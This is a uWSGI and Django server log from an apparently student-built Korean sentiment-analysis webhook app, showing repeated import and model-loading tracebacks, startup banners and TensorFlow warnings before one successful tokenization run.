    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp1
  File "./haniumapp/naverNlp1.py", line 57
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4555|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:34:38 2020] POST /webhook/ => generated 114346 bytes in 76 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp1
  File "./haniumapp/naverNlp1.py", line 57
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4555|app: 0|req: 2/2] 223.194.169.151 () {50 vars in 873 bytes} [Thu Aug 27 06:34:42 2020] GET / => generated 115063 bytes in 72 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /favicon.ico
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp1
  File "./haniumapp/naverNlp1.py", line 57
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4555|app: 0|req: 3/3] 223.194.169.151 () {48 vars in 791 bytes} [Thu Aug 27 06:34:42 2020] GET /favicon.ico => generated 130886 bytes in 77 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:58:40 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x564b8a34cd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x564b8a34cd00 pid: 4670 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4670, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 97
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4670|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 06:58:47 2020] POST /webhook/ => generated 114340 bytes in 76 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:59:15 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x556b2b1f8d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556b2b1f8d00 pid: 4676 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4676, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 97
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4676|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 06:59:19 2020] POST /webhook/ => generated 114340 bytes in 75 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 07:00:55 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x564bb4b39d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564bb4b39d00 pid: 4685 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4685, cores: 1)
[pid: 4685|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 07:00:59 2020] POST /webhook/ => generated 85 bytes in 5 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
Gracefully killing worker 1 (pid: 4685)...
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 07:20:04 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5612903dcd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5612903dcd00 pid: 6140 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 6140, cores: 1)
2020-08-28 07:20:28.449790: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 07:20:28.449823: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 9, in <module>
    from . import nlp
  File "./haniumapp/nlp.py", line 23, in <module>
    f = open('list_data.csv','r')
FileNotFoundError: [Errno 2] No such file or directory: 'list_data.csv'
[pid: 6140|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 07:20:27 2020] POST /webhook/ => generated 128202 bytes in 3175 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 07:25:12 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560ce46a3d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560ce46a3d00 pid: 6191 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 6191, cores: 1)
2020-08-28 07:25:49.637764: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 07:25:49.637797: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 9, in <module>
    from . import nlp
  File "./haniumapp/nlp.py", line 62, in <module>
    loaded_model = load_model('best_model.h5')
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: best_model.h5/{saved_model.pbtxt|saved_model.pb}
Fri Aug 28 07:26:04 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.249.84.13) !!!
Fri Aug 28 07:26:04 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.249.84.13)
OSError: write error
[pid: 6191|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 07:25:49 2020] POST /webhook/ => generated 32611 bytes in 15160 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
파일열기시작
파일열기끝
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 11:59:04 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56296b372cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56296b372cf0 pid: 1673 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1673, cores: 1)
2020-08-28 11:59:35.336388: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 11:59:35.336426: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
2020-08-28 11:59:46.120838: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 11:59:46.120870: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 11:59:46.120890: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 11:59:46.121106: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 11:59:46.159039: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 11:59:46.159485: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x562970266350 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 11:59:46.159504: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 11:59:46.527320: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 11:59:46.528808: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 11:59:46.530183: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['이', '영화', '개꿀잼', 'ㅋㅋㅋ']
['영화', '개꿀잼', 'ㅋㅋㅋ']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
2020-08-28 11:59:50.866559: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 11:59:51.200895: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 11:59:51.202346: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 11:59:51.203763: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
